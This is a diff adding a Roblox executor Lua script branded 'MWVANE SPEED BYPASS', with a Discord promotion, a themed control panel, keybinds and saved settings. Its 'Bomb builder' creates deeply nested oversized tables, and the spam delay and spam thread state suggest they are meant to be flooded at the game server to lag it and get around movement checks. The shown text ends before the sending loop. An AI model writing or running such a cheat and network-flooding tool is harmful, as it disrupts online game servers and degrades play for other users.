@@ -1,0 +1,1103 @@
+--==============================================================
+--  MWVANE SPEED BYPASS  (standalone)
+--  Full GUI + Logic
+--==============================================================
+_G.OpenMWVaneSpeedBypass = function()
+	local ok, result = pcall(function()
+		repeat
+			task.wait()
+		until game:IsLoaded()
+
+		local UserInputService = game:GetService("UserInputService")
+		local HttpService     = game:GetService("HttpService")
+		local CoreGui         = game:GetService("CoreGui")
+		local TweenService    = game:GetService("TweenService")
+		local NetworkClient   = game:GetService("NetworkClient")
+		local Players         = game:GetService("Players")
+		local SoundService    = game:GetService("SoundService")
+		local genv = getgenv and getgenv() or _G
+
+		if genv.MWVaneSpeedBypassStop then
+			pcall(genv.MWVaneSpeedBypassStop)
+		end
+
+		for _, name in ipairs({"Impulse Bypass","ImpulseBypass","Cola Bypass","ColaBypass"}) do
+			local old = CoreGui:FindFirstChild(name)
+			if old then old:Destroy() end
+			local pg = Players.LocalPlayer and Players.LocalPlayer:FindFirstChildOfClass("PlayerGui")
+			local oldPg = pg and pg:FindFirstChild(name)
+			if oldPg then oldPg:Destroy() end
+		end
+
+		local Config = {
+			Keybind = "V",
+			GamepadKeybind = "ButtonY",
+			Power = 97000,
+			MobilePower = 72000,
+			SpamDelay = 0.12,
+			Mode = "PC",
+			Enabled = false,
+			Theme = "MWVANE",
+			PositionX = 0,
+			PositionY = 0,
+			Minimized = false,
+		}
+
+		local GAMEPAD_BUTTONS = {
+			ButtonA=true, ButtonB=true, ButtonX=true, ButtonY=true,
+			ButtonL1=true, ButtonR1=true, ButtonL2=true, ButtonR2=true,
+			DPadUp=true, DPadDown=true, DPadLeft=true, DPadRight=true,
+		}
+
+		local vantaAccent = _G._VantaAccent or Color3.fromRGB(60, 208, 143)
+		local Themes = {
+			MWVANE  = { Accent = vantaAccent,                                   Dark = vantaAccent:Lerp(Color3.new(0,0,0),0.56), Soft = vantaAccent:Lerp(Color3.new(0,0,0),0.83) },
+			IMPULSE = { Accent = Color3.fromRGB(158,72,255),                    Dark = Color3.fromRGB(73,28,128),  Soft = Color3.fromRGB(27,10,45) },
+			NEON    = { Accent = Color3.fromRGB(205,74,255),                    Dark = Color3.fromRGB(104,25,170), Soft = Color3.fromRGB(37,7,58) },
+			CRIMSON = { Accent = Color3.fromRGB(225,64,96),                     Dark = Color3.fromRGB(112,23,44),  Soft = Color3.fromRGB(42,8,17) },
+			EMERALD = { Accent = Color3.fromRGB(60,208,143),                    Dark = Color3.fromRGB(20,101,66),  Soft = Color3.fromRGB(6,35,23) },
+			AMBER   = { Accent = Color3.fromRGB(239,190,63),                    Dark = Color3.fromRGB(120,72,20),  Soft = Color3.fromRGB(40,24,6) },
+			MONO    = { Accent = Color3.fromRGB(220,220,226),                   Dark = Color3.fromRGB(91,91,99),   Soft = Color3.fromRGB(26,26,29) },
+		}
+		local ThemeOrder = {"MWVANE","IMPULSE","NEON","CRIMSON","EMERALD","AMBER","MONO"}
+
+		--==========================================================
+		--  Config persistence
+		--==========================================================
+		local function SaveConfig()
+			if writefile then
+				pcall(function()
+					writefile("MWVaneSpeedBypass.json", HttpService:JSONEncode(Config))
+				end)
+			end
+		end
+		local function LoadConfig()
+			if not (isfile and readfile and isfile("MWVaneSpeedBypass.json")) then return end
+			local ok, root = pcall(function()
+				return HttpService:JSONDecode(readfile("MWVaneSpeedBypass.json"))
+			end)
+			if not ok or type(root) ~= "table" then return end
+			if type(root.Keybind) == "string" then Config.Keybind = root.Keybind end
+			if type(root.Power) == "number" then Config.Power = math.clamp(math.floor(root.Power),1000,150000) end
+			if type(root.MobilePower) == "number" then Config.MobilePower = math.clamp(math.floor(root.MobilePower),1000,150000) end
+			if type(root.SpamDelay) == "number" then Config.SpamDelay = math.clamp(root.SpamDelay,0.03,1) end
+			if type(root.GamepadKeybind) == "string" and GAMEPAD_BUTTONS[root.GamepadKeybind] then
+				Config.GamepadKeybind = root.GamepadKeybind
+			end
+			if root.Mode == "PC" or root.Mode == "Mobile" then Config.Mode = root.Mode end
+			if type(root.Enabled) == "boolean" then Config.Enabled = root.Enabled end
+			if type(root.Theme) == "string" and Themes[root.Theme] then Config.Theme = root.Theme end
+			if type(root.PositionX) == "number" then Config.PositionX = math.floor(root.PositionX) end
+			if type(root.PositionY) == "number" then Config.PositionY = math.floor(root.PositionY) end
+			if type(root.Minimized) == "boolean" then Config.Minimized = root.Minimized end
+		end
+		LoadConfig()
+		Config.Theme = "MWVANE"
+
+		local gamepadKeybind = Enum.KeyCode[Config.GamepadKeybind] or Enum.KeyCode.ButtonY
+
+		--==========================================================
+		--  Sounds
+		--==========================================================
+		local ClickSound = Instance.new("Sound")
+		ClickSound.Name = "MWVaneSpeedBypassClick"
+		ClickSound.SoundId = "rbxassetid://102702078778790"
+		ClickSound.Volume = 0.42
+		ClickSound.Parent = SoundService
+
+		local KeybindSound = Instance.new("Sound")
+		KeybindSound.Name = "MWVaneSpeedBypassKeybind"
+		KeybindSound.SoundId = "rbxassetid://113108830240353"
+		KeybindSound.Volume = 0.55
+		KeybindSound.Parent = SoundService
+
+		local function playSound(fromKeybind)
+			local s = fromKeybind and KeybindSound or ClickSound
+			pcall(function()
+				s.TimePosition = 0
+				s:Play()
+			end)
+		end
+
+		--==========================================================
+		--  Bomb builder
+		--==========================================================
+		local function buildBomb(power)
+			local maintable = {}
+			local spammed = { {} }
+			local z = spammed[1]
+			for _ = 1, 296 do
+				local t = {}
+				table.insert(z, t)
+				z = t
+			end
+			local maxRep = math.floor(power / 298)
+			for _ = 1, maxRep do
+				table.insert(maintable, spammed)
+			end
+			return maintable
+		end
+
+		--==========================================================
+		--  GUI
+		--==========================================================
+		local ScreenGui = Instance.new("ScreenGui")
+		ScreenGui.Name = "Mwvane Speed bypass"
+		ScreenGui.ResetOnSpawn = false
+		ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+		ScreenGui.DisplayOrder = 60
+		if not pcall(function() ScreenGui.Parent = CoreGui end) then
+			ScreenGui.Parent = Players.LocalPlayer:WaitForChild("PlayerGui")
+		end
+
+		local WIDTH = UserInputService.TouchEnabled and 318 or 350
+
+		local MainFrame = Instance.new("Frame")
+		MainFrame.Name = "Main"
+		MainFrame.AnchorPoint = Vector2.new(0.5, 0.5)
+		MainFrame.Position = UDim2.new(0.5, Config.PositionX, 0.5, Config.PositionY)
+		MainFrame.Size = UDim2.fromOffset(WIDTH, Config.Minimized and 74 or 342)
+		MainFrame.BackgroundColor3 = Color3.fromRGB(4, 3, 7)
+		MainFrame.BackgroundTransparency = 0.02
+		MainFrame.BorderSizePixel = 0
+		MainFrame.ClipsDescendants = true
+		MainFrame.Parent = ScreenGui
+		Instance.new("UICorner", MainFrame).CornerRadius = UDim.new(0, 14)
+
+		local MainStroke = Instance.new("UIStroke", MainFrame)
+		MainStroke.Thickness = 1.3
+		MainStroke.Transparency = 0.08
+
+		local BackGradient = Instance.new("UIGradient", MainFrame)
+		BackGradient.Rotation = 25
+
+		-- Header
+		local Header = Instance.new("Frame", MainFrame)
+		Header.Name = "Header"
+		Header.Position = UDim2.fromOffset(10, 10)
+		Header.Size = UDim2.new(1, -20, 0, 54)
+		Header.BackgroundColor3 = Color3.fromRGB(2, 2, 4)
+		Header.BackgroundTransparency = 0.05
+		Header.BorderSizePixel = 0
+		Header.Active = true
+		Header.ZIndex = 3
+		Instance.new("UICorner", Header).CornerRadius = UDim.new(0, 11)
+
+		local HeaderStroke = Instance.new("UIStroke", Header)
+		HeaderStroke.Thickness = 1
+		HeaderStroke.Transparency = 0.42
+
+		local TopRail = Instance.new("Frame", Header)
+		TopRail.Position = UDim2.fromOffset(14, 0)
+		TopRail.Size = UDim2.new(1, -28, 0, 2)
+		TopRail.BorderSizePixel = 0
+		TopRail.ZIndex = 5
+		Instance.new("UICorner", TopRail).CornerRadius = UDim.new(1, 0)
+
+		local Title = Instance.new("TextLabel", Header)
+		Title.Position = UDim2.fromOffset(18, 4)
+		Title.Size = UDim2.new(1, -164, 0, 20)
+		Title.BackgroundTransparency = 1
+		Title.Text = "MWVANE"
+		Title.TextColor3 = Color3.fromRGB(242, 240, 245)
+		Title.Font = Enum.Font.GothamBold
+		Title.TextSize = 18
+		Title.TextXAlignment = Enum.TextXAlignment.Left
+		Title.ZIndex = 7
+
+		local Discord = Instance.new("TextLabel", Header)
+		Discord.Name = "Discord"
+		Discord.Position = UDim2.fromOffset(24, 25)
+		Discord.Size = UDim2.new(1, -164, 0, 14)
+		Discord.BackgroundTransparency = 1
+		Discord.Text = "discord.gg/mwvanehub"
+		Discord.TextColor3 = Color3.fromRGB(190, 190, 196)
+		Discord.Font = Enum.Font.GothamMedium
+		Discord.TextSize = 9
+		Discord.TextXAlignment = Enum.TextXAlignment.Left
+		Discord.ZIndex = 4
+
+		local HeaderState = Instance.new("Frame", Header)
+		HeaderState.AnchorPoint = Vector2.new(1, 0.5)
+		HeaderState.Position = UDim2.new(1, -52, 0.5, 0)
+		HeaderState.Size = UDim2.fromOffset(76, 28)
+		HeaderState.BackgroundColor3 = Color3.fromRGB(10, 9, 13)
+		HeaderState.BackgroundTransparency = 0.04
+		HeaderState.BorderSizePixel = 0
+		HeaderState.ZIndex = 4
+		Instance.new("UICorner", HeaderState).CornerRadius = UDim.new(0, 8)
+
+		local HeaderStateStroke = Instance.new("UIStroke", HeaderState)
+		HeaderStateStroke.Thickness = 1
+		HeaderStateStroke.Transparency = 0.38
+
+		local HeaderStateDot = Instance.new("Frame", HeaderState)
+		HeaderStateDot.AnchorPoint = Vector2.new(0, 0.5)
+		HeaderStateDot.Position = UDim2.new(0, 10, 0.5, 0)
+		HeaderStateDot.Size = UDim2.fromOffset(7, 7)
+		HeaderStateDot.BorderSizePixel = 0
+		HeaderStateDot.ZIndex = 5
+		Instance.new("UICorner", HeaderStateDot).CornerRadius = UDim.new(1, 0)
+
+		local HeaderStateText = Instance.new("TextLabel", HeaderState)
+		HeaderStateText.Position = UDim2.fromOffset(22, 0)
+		HeaderStateText.Size = UDim2.new(1, -27, 1, 0)
+		HeaderStateText.BackgroundTransparency = 1
+		HeaderStateText.Text = "READY"
+		HeaderStateText.TextColor3 = Color3.fromRGB(160, 157, 167)
+		HeaderStateText.Font = Enum.Font.GothamBold
+		HeaderStateText.TextSize = 8
+		HeaderStateText.TextXAlignment = Enum.TextXAlignment.Left
+		HeaderStateText.ZIndex = 5
+
+		local Minimize = Instance.new("TextButton", Header)
+		Minimize.AnchorPoint = Vector2.new(1, 0)
+		Minimize.Position = UDim2.new(1, -10, 0, 13)
+		Minimize.Size = UDim2.fromOffset(28, 32)
+		Minimize.BackgroundColor3 = Color3.fromRGB(10, 9, 13)
+		Minimize.BackgroundTransparency = 0.08
+		Minimize.BorderSizePixel = 0
+		Minimize.AutoButtonColor = false
+		Minimize.Text = "-"
+		Minimize.TextColor3 = Color3.fromRGB(194, 191, 202)
+		Minimize.Font = Enum.Font.GothamBold
+		Minimize.TextSize = 17
+		Minimize.ZIndex = 5
+		Instance.new("UICorner", Minimize).CornerRadius = UDim.new(0, 8)
+		local MinimizeStroke = Instance.new("UIStroke", Minimize)
+		MinimizeStroke.Thickness = 1
+		MinimizeStroke.Transparency = 0.34
+
+		-- Status strip
+		local StatusStrip = Instance.new("Frame", MainFrame)
+		StatusStrip.Position = UDim2.fromOffset(10, 74)
+		StatusStrip.Size = UDim2.new(1, -20, 0, 34)
+		StatusStrip.BackgroundColor3 = Color3.fromRGB(8, 7, 12)
+		StatusStrip.BackgroundTransparency = 0.05
+		StatusStrip.BorderSizePixel = 0
+		Instance.new("UICorner", StatusStrip).CornerRadius = UDim.new(0, 9)
+
+		local StatusStroke = Instance.new("UIStroke", StatusStrip)
+		StatusStroke.Thickness = 1
+		StatusStroke.Transparency = 0.5
+
+		local StatusDot = Instance.new("Frame", StatusStrip)
+		StatusDot.AnchorPoint = Vector2.new(0, 0.5)
+		StatusDot.Position = UDim2.new(0, 13, 0.5, 0)
+		StatusDot.Size = UDim2.fromOffset(8, 8)
+		StatusDot.BorderSizePixel = 0
+		Instance.new("UICorner", StatusDot).CornerRadius = UDim.new(1, 0)
+
+		local StatusLabel = Instance.new("TextLabel", StatusStrip)
+		StatusLabel.Position = UDim2.fromOffset(30, 0)
+		StatusLabel.Size = UDim2.new(0.58, -35, 1, 0)
+		StatusLabel.BackgroundTransparency = 1
+		StatusLabel.Text = "BYPASS DISABLED"
+		StatusLabel.TextColor3 = Color3.fromRGB(190, 187, 196)
+		StatusLabel.Font = Enum.Font.GothamBold
+		StatusLabel.TextSize = 10
+		StatusLabel.TextXAlignment = Enum.TextXAlignment.Left
+
+		local PowerStatus = Instance.new("TextLabel", StatusStrip)
+		PowerStatus.Position = UDim2.new(0.58, 0, 0, 0)
+		PowerStatus.Size = UDim2.new(0.42, -13, 1, 0)
+		PowerStatus.BackgroundTransparency = 1
+		PowerStatus.Text = tostring(Config.Power) .. " POWER"
+		PowerStatus.TextColor3 = Color3.fromRGB(128, 125, 135)
+		PowerStatus.Font = Enum.Font.GothamMedium
+		PowerStatus.TextSize = 9
+		PowerStatus.TextXAlignment = Enum.TextXAlignment.Right
+
+		-- Tab bar
+		local TabBar = Instance.new("Frame", MainFrame)
+		TabBar.Position = UDim2.fromOffset(10, 116)
+		TabBar.Size = UDim2.new(1, -20, 0, 34)
+		TabBar.BackgroundColor3 = Color3.fromRGB(6, 5, 9)
+		TabBar.BackgroundTransparency = 0.03
+		TabBar.BorderSizePixel = 0
+		TabBar.ClipsDescendants = true
+		Instance.new("UICorner", TabBar).CornerRadius = UDim.new(0, 9)
+
+		local TabBarStroke = Instance.new("UIStroke", TabBar)
+		TabBarStroke.Thickness = 1
+		TabBarStroke.Transparency = 0.5
+
+		local MainTab = Instance.new("TextButton", TabBar)
+		MainTab.Position = UDim2.fromOffset(7, 7)
+		MainTab.Size = UDim2.new(0.3333333333333333, -5, 1, -8)
+		MainTab.BackgroundTransparency = 0.02
+		MainTab.BorderSizePixel = 0
+		MainTab.AutoButtonColor = false
+		MainTab.Text = "MAIN"
+		MainTab.Font = Enum.Font.GothamBold
+		MainTab.TextSize = 9
+		Instance.new("UICorner", MainTab).CornerRadius = UDim.new(0, 7)
+
+		local ControlsTab = Instance.new("TextButton", TabBar)
+		ControlsTab.Position = UDim2.new(0.3333333333333333, 1, 0, 4)
+		ControlsTab.Size = UDim2.new(0.3333333333333333, -4, 1, -8)
+		ControlsTab.BackgroundColor3 = Color3.fromRGB(9, 8, 12)
+		ControlsTab.BackgroundTransparency = 0.15
+		ControlsTab.BorderSizePixel = 0
+		ControlsTab.AutoButtonColor = false
+		ControlsTab.Text = "CONTROLS"
+		ControlsTab.TextColor3 = Color3.fromRGB(132, 129, 139)
+		ControlsTab.Font = Enum.Font.GothamBold
+		ControlsTab.TextSize = 8
+		Instance.new("UICorner", ControlsTab).CornerRadius = UDim.new(0, 7)
+
+		local VisualTab = Instance.new("TextButton", TabBar)
+		VisualTab.Position = UDim2.new(0.6666666666666666, 0, 0, 7)
+		VisualTab.Size = UDim2.new(0.3333333333333333, -7, 1, -8)
+		VisualTab.BackgroundColor3 = Color3.fromRGB(9, 8, 12)
+		VisualTab.BackgroundTransparency = 0.15
+		VisualTab.BorderSizePixel = 0
+		VisualTab.AutoButtonColor = false
+		VisualTab.Text = "BACKGROUND"
+		VisualTab.TextColor3 = Color3.fromRGB(132, 129, 139)
+		VisualTab.Font = Enum.Font.GothamBold
+		VisualTab.TextSize = 9
+		Instance.new("UICorner", VisualTab).CornerRadius = UDim.new(0, 7)
+
+		-- Content
+		local Content = Instance.new("Frame", MainFrame)
+		Content.Position = UDim2.fromOffset(10, 158)
+		Content.Size = UDim2.new(1, -20, 0, 141)
+		Content.BackgroundTransparency = 1
+		Content.ClipsDescendants = true
+
+		local MainPage = Instance.new("Frame", Content)
+		MainPage.Name = "MainPage"
+		MainPage.Size = UDim2.fromScale(1, 1)
+		MainPage.BackgroundTransparency = 1
+		local MainPageLayout = Instance.new("UIListLayout", MainPage)
+		MainPageLayout.SortOrder = Enum.SortOrder.LayoutOrder
+		MainPageLayout.Padding = UDim.new(0, 7)
+
+		local ControlsPage = Instance.new("Frame", Content)
+		ControlsPage.Name = "ControlsPage"
+		ControlsPage.Position = UDim2.new(1, 12, 0, 0)
+		ControlsPage.Size = UDim2.fromScale(1, 1)
+		ControlsPage.BackgroundTransparency = 1
+		ControlsPage.Visible = false
+		local ControlsPageLayout = Instance.new("UIListLayout", ControlsPage)
+		ControlsPageLayout.SortOrder = Enum.SortOrder.LayoutOrder
+		ControlsPageLayout.Padding = UDim.new(0, 6)
+
+		local VisualPage = Instance.new("Frame", Content)
+		VisualPage.Name = "VisualPage"
+		VisualPage.Position = UDim2.new(1, 12, 0, 0)
+		VisualPage.Size = UDim2.fromScale(1, 1)
+		VisualPage.BackgroundTransparency = 1
+		VisualPage.Visible = false
+		local VisualPageLayout = Instance.new("UIListLayout", VisualPage)
+		VisualPageLayout.SortOrder = Enum.SortOrder.LayoutOrder
+		VisualPageLayout.Padding = UDim.new(0, 6)
+
+		-- Row helper
+		local function makeRow(parent, name, label, order)
+			local row = Instance.new("Frame", parent)
+			row.Name = name
+			row.Size = UDim2.new(1, 0, 0, 43)
+			row.BackgroundColor3 = Color3.fromRGB(9, 8, 12)
+			row.BackgroundTransparency = 0.04
+			row.BorderSizePixel = 0
+			row.LayoutOrder = order
+			Instance.new("UICorner", row).CornerRadius = UDim.new(0, 9)
+			local stroke = Instance.new("UIStroke", row)
+			stroke.Thickness = 1
+			stroke.Transparency = 0.56
+			local edge = Instance.new("Frame", row)
+			edge.Size = UDim2.new(0, 3, 0, 23)
+			edge.AnchorPoint = Vector2.new(0, 0.5)
+			edge.Position = UDim2.new(0, 0, 0.5, 0)
+			edge.BorderSizePixel = 0
+			Instance.new("UICorner", edge).CornerRadius = UDim.new(1, 0)
+			local text = Instance.new("TextLabel", row)
+			text.Position = UDim2.fromOffset(14, 0)
+			text.Size = UDim2.new(0.52, -14, 1, 0)
+			text.BackgroundTransparency = 1
+			text.Text = label
+			text.TextColor3 = Color3.fromRGB(215, 212, 220)
+			text.Font = Enum.Font.GothamMedium
+			text.TextSize = 11
+			text.TextXAlignment = Enum.TextXAlignment.Left
+			return row, stroke, edge
+		end
+
+		-- Bypass toggle row
+		local ToggleRow, ToggleRowStroke, ToggleEdge = makeRow(MainPage, "Bypass", "Bypass", 1)
+		local ToggleBtn = Instance.new("TextButton", ToggleRow)
+		ToggleBtn.AnchorPoint = Vector2.new(1, 0.5)
+		ToggleBtn.Position = UDim2.new(1, -10, 0.5, 0)
+		ToggleBtn.Size = UDim2.fromOffset(112, 29)
+		ToggleBtn.BackgroundColor3 = Color3.fromRGB(14, 13, 17)
+		ToggleBtn.BorderSizePixel = 0
+		ToggleBtn.AutoButtonColor = false
+		ToggleBtn.Text = "DISABLED"
+		ToggleBtn.TextColor3 = Color3.fromRGB(151, 148, 158)
+		ToggleBtn.Font = Enum.Font.GothamBold
+		ToggleBtn.TextSize = 9
+		Instance.new("UICorner", ToggleBtn).CornerRadius = UDim.new(0, 8)
+		local ToggleStroke = Instance.new("UIStroke", ToggleBtn)
+		ToggleStroke.Thickness = 1
+
+		-- Mode row
+		local ModeRow, ModeRowStroke, ModeEdge = makeRow(MainPage, "Mode", "Power Mode", 2)
+		local PCModeButton = Instance.new("TextButton", ModeRow)
+		PCModeButton.AnchorPoint = Vector2.new(1, 0.5)
+		PCModeButton.Position = UDim2.new(1, -70, 0.5, 0)
+		PCModeButton.Size = UDim2.fromOffset(54, 29)
+		PCModeButton.BackgroundColor3 = Color3.fromRGB(14, 13, 17)
+		PCModeButton.BorderSizePixel = 0
+		PCModeButton.AutoButtonColor = false
+		PCModeButton.Text = "PC"
+		PCModeButton.Font = Enum.Font.GothamBold
+		PCModeButton.TextSize = 9
+		Instance.new("UICorner", PCModeButton).CornerRadius = UDim.new(0, 2)
+
+		local MobileModeButton = Instance.new("TextButton", ModeRow)
+		MobileModeButton.AnchorPoint = Vector2.new(1, 0.5)
+		MobileModeButton.Position = UDim2.new(1, -10, 0.5, 0)
+		MobileModeButton.Size = UDim2.fromOffset(54, 29)
+		MobileModeButton.BackgroundColor3 = Color3.fromRGB(14, 13, 17)
+		MobileModeButton.BorderSizePixel = 0
+		MobileModeButton.AutoButtonColor = false
+		MobileModeButton.Text = "MOBILE"
+		MobileModeButton.Font = Enum.Font.GothamBold
+		MobileModeButton.TextSize = 8
+		Instance.new("UICorner", MobileModeButton).CornerRadius = UDim.new(0, 7)
+
+		-- Keybind row
+		local KeyRow, KeyRowStroke, KeyEdge = makeRow(ControlsPage, "Keybind", "Keyboard", 1)
+		local KeybindBtn = Instance.new("TextButton", KeyRow)
+		KeybindBtn.AnchorPoint = Vector2.new(1, 0.5)
+		KeybindBtn.Position = UDim2.new(1, -10, 0.5, 0)
+		KeybindBtn.Size = UDim2.fromOffset(112, 29)
+		KeybindBtn.BackgroundColor3 = Color3.fromRGB(14, 13, 17)
+		KeybindBtn.BorderSizePixel = 0
+		KeybindBtn.AutoButtonColor = false
+		KeybindBtn.Text = Config.Keybind
+		KeybindBtn.TextColor3 = Color3.fromRGB(206, 203, 212)
+		KeybindBtn.Font = Enum.Font.GothamBold
+		KeybindBtn.TextSize = 10
+		Instance.new("UICorner", KeybindBtn).CornerRadius = UDim.new(0, 8)
+		local KeybindStroke = Instance.new("UIStroke", KeybindBtn)
+		KeybindStroke.Thickness = 1
+
+		local PadRow, PadRowStroke, PadEdge = makeRow(ControlsPage, "Gamepad", "Gamepad", 2)
+		local GamepadBtn = Instance.new("TextButton", PadRow)
+		GamepadBtn.AnchorPoint = Vector2.new(1, 0.5)
+		GamepadBtn.Position = UDim2.new(1, -10, 0.5, 0)
+		GamepadBtn.Size = UDim2.fromOffset(112, 29)
+		GamepadBtn.BackgroundColor3 = Color3.fromRGB(14, 13, 17)
+		GamepadBtn.BorderSizePixel = 0
+		GamepadBtn.AutoButtonColor = false
+		GamepadBtn.Text = Config.GamepadKeybind
+		GamepadBtn.TextColor3 = Color3.fromRGB(206, 203, 212)
+		GamepadBtn.Font = Enum.Font.GothamBold
+		GamepadBtn.TextSize = 9
+		Instance.new("UICorner", GamepadBtn).CornerRadius = UDim.new(0, 8)
+		local GamepadStroke = Instance.new("UIStroke", GamepadBtn)
+		GamepadStroke.Thickness = 1
+
+		-- Panel position reset row
+		local ResetRow, ResetRowStroke, ResetEdge = makeRow(ControlsPage, "ResetPosition", "Panel Position", 3)
+		local ResetBtn = Instance.new("TextButton", ResetRow)
+		ResetBtn.AnchorPoint = Vector2.new(1, 0.5)
+		ResetBtn.Position = UDim2.new(1, -10, 0.5, 0)
+		ResetBtn.Size = UDim2.fromOffset(112, 29)
+		ResetBtn.BackgroundColor3 = Color3.fromRGB(14, 13, 17)
+		ResetBtn.BorderSizePixel = 0
+		ResetBtn.Text = "RESET POSITION"
+		ResetBtn.TextColor3 = Color3.fromRGB(235, 255, 55)
+		ResetBtn.Font = Enum.Font.GothamBold
+		ResetBtn.TextSize = 9
+		ResetBtn.AutoButtonColor = false
+		Instance.new("UICorner", ResetBtn).CornerRadius = UDim.new(0, 8)
+		Instance.new("UIStroke", ResetBtn).Thickness = 1
+
+		-- Power input row
+		local PowerRow, PowerRowStroke, PowerEdge = makeRow(MainPage, "Power", "Power", 3)
+		local InputBox = Instance.new("TextBox", PowerRow)
+		InputBox.AnchorPoint = Vector2.new(1, 0.5)
+		InputBox.Position = UDim2.new(1, -10, 0.5, 0)
+		InputBox.Size = UDim2.fromOffset(112, 29)
+		InputBox.BackgroundColor3 = Color3.fromRGB(14, 13, 17)
+		InputBox.BorderSizePixel = 0
+		InputBox.Text = tostring(Config.Power)
+		InputBox.PlaceholderText = "1000 - 150000 / 97K"
+		InputBox.PlaceholderColor3 = Color3.fromRGB(91, 88, 98)
+		InputBox.TextColor3 = Color3.fromRGB(216, 213, 222)
+		InputBox.Font = Enum.Font.GothamBold
+		InputBox.TextSize = 10
+		InputBox.ClearTextOnFocus = false
+		Instance.new("UICorner", InputBox).CornerRadius = UDim.new(0, 8)
+		local InputStroke = Instance.new("UIStroke", InputBox)
+		InputStroke.Thickness = 1
+
+		-- Background / theme row
+		local ThemeRow, ThemeRowStroke, ThemeEdge = makeRow(VisualPage, "Background", "Background", 1)
+		local ThemeBack = Instance.new("TextButton", ThemeRow)
+		ThemeBack.AnchorPoint = Vector2.new(1, 0.5)
+		ThemeBack.Position = UDim2.new(1, -132, 0.5, 0)
+		ThemeBack.Size = UDim2.fromOffset(28, 29)
+		ThemeBack.BackgroundColor3 = Color3.fromRGB(14, 13, 17)
+		ThemeBack.BorderSizePixel = 0
+		ThemeBack.Text = "<"
+		ThemeBack.TextColor3 = Color3.fromRGB(169, 166, 176)
+		ThemeBack.Font = Enum.Font.GothamBold
+		ThemeBack.TextSize = 12
+		ThemeBack.AutoButtonColor = false
+		Instance.new("UICorner", ThemeBack).CornerRadius = UDim.new(0, 7)
+
+		local ThemeButton = Instance.new("TextButton", ThemeRow)
+		ThemeButton.AnchorPoint = Vector2.new(1, 0.5)
+		ThemeButton.Position = UDim2.new(1, -39, 0.5, 0)
+		ThemeButton.Size = UDim2.fromOffset(86, 29)
+		ThemeButton.BackgroundColor3 = Color3.fromRGB(14, 13, 17)
+		ThemeButton.BorderSizePixel = 0
+		ThemeButton.Text = Config.Theme
+		ThemeButton.Font = Enum.Font.GothamBold
+		ThemeButton.TextSize = 8
+		ThemeButton.AutoButtonColor = false
+		Instance.new("UICorner", ThemeButton).CornerRadius = UDim.new(0, 7)
+
+		local ThemeNext = Instance.new("TextButton", ThemeRow)
+		ThemeNext.AnchorPoint = Vector2.new(1, 0.5)
+		ThemeNext.Position = UDim2.new(1, -10, 0.5, 0)
+		ThemeNext.Size = UDim2.fromOffset(32, 29)
+		ThemeNext.BackgroundColor3 = Color3.fromRGB(14, 13, 17)
+		ThemeNext.BorderSizePixel = 0
+		ThemeNext.Text = ">"
+		ThemeNext.TextColor3 = Color3.fromRGB(169, 166, 176)
+		ThemeNext.Font = Enum.Font.GothamBold
+		ThemeNext.TextSize = 12
+		ThemeNext.AutoButtonColor = false
+		Instance.new("UICorner", ThemeNext).CornerRadius = UDim.new(0, 7)
+
+		local ThemePreview = Instance.new("Frame", VisualPage)
+		ThemePreview.Name = "ThemePreview"
+		ThemePreview.Size = UDim2.new(1, 0, 0, 92)
+		ThemePreview.BackgroundColor3 = Color3.fromRGB(9, 8, 12)
+		ThemePreview.BackgroundTransparency = 0.04
+		ThemePreview.BorderSizePixel = 0
+		ThemePreview.LayoutOrder = 2
+		Instance.new("UICorner", ThemePreview).CornerRadius = UDim.new(0, 9)
+		local ThemePreviewStroke = Instance.new("UIStroke", ThemePreview)
+		ThemePreviewStroke.Thickness = 1
+		ThemePreviewStroke.Transparency = 0.52
+
+		local PreviewRail = Instance.new("Frame", ThemePreview)
+		PreviewRail.Position = UDim2.fromOffset(12, 12)
+		PreviewRail.Size = UDim2.new(1, -24, 0, 3)
+		PreviewRail.BorderSizePixel = 0
+		Instance.new("UICorner", PreviewRail).CornerRadius = UDim.new(1, 0)
+
+		local PreviewTitle = Instance.new("TextLabel", ThemePreview)
+		PreviewTitle.Position = UDim2.fromOffset(13, 23)
+		PreviewTitle.Size = UDim2.new(1, -26, 0, 18)
+		PreviewTitle.BackgroundTransparency = 1
+		PreviewTitle.Text = "ACTIVE PALETTE"
+		PreviewTitle.TextColor3 = Color3.fromRGB(136, 133, 143)
+		PreviewTitle.Font = Enum.Font.GothamBold
+		PreviewTitle.TextSize = 8
+		PreviewTitle.TextXAlignment = Enum.TextXAlignment.Left
+
+		local PreviewName = Instance.new("TextLabel", ThemePreview)
+		PreviewName.Position = UDim2.fromOffset(13, 40)
+		PreviewName.Size = UDim2.new(0.55, -13, 0, 27)
+		PreviewName.BackgroundTransparency = 1
+		PreviewName.Text = Config.Theme
+		PreviewName.Font = Enum.Font.GothamBold
+		PreviewName.TextSize = 15
+		PreviewName.TextXAlignment = Enum.TextXAlignment.Left
+
+		local PreviewSwatches = {}
+		for i = 1, 3 do
+			local swatch = Instance.new("Frame", ThemePreview)
+			swatch.AnchorPoint = Vector2.new(1, 0.5)
+			swatch.Position = UDim2.new(1, -(12 + (3 - i) * 38), 0.5, 14)
+			swatch.Size = UDim2.fromOffset(27, 27)
+			swatch.BorderSizePixel = 0
+			Instance.new("UICorner", swatch).CornerRadius = UDim.new(0, 7)
+			local ss = Instance.new("UIStroke", swatch)
+			ss.Color = Color3.fromRGB(255,255,255)
+			ss.Transparency = 0.82
+			ss.Thickness = 1
+			PreviewSwatches[i] = swatch
+		end
+
+		-- Footer
+		local Footer = Instance.new("TextLabel", MainFrame)
+		Footer.AnchorPoint = Vector2.new(0, 1)
+		Footer.Position = UDim2.new(0, 16, 1, -8)
+		Footer.Size = UDim2.new(1, -32, 0, 22)
+		Footer.BackgroundTransparency = 1
+		Footer.Text = "MWVANE SPEED BYPASS  /  CONFIG SAVED"
+		Footer.TextColor3 = Color3.fromRGB(99, 96, 106)
+		Footer.Font = Enum.Font.GothamMedium
+		Footer.TextSize = 8
+		Footer.TextXAlignment = Enum.TextXAlignment.Left
+
+		--==========================================================
+		--  State
+		--==========================================================
+		local running = Config.Enabled == true
+		local bomb = nil
+		local spamThread = nil
+		local listeningForKey = false
+		local listeningForPad = false
+		local minimized = Config.Minimized == true
+		local shuttingDown = false
+		local activePage = "MAIN"
+		local pageToken = 0
+
+		local function getCurrentPower()
+			return Config.Mode == "Mobile" and Config.MobilePower or Config.Power
+		end
+
+		local function formatPower(n)
+			if n >= 1000 then
+				return string.format("%dK", math.floor(n / 1000 + 0.5))
+			end
+			return tostring(n)
+		end
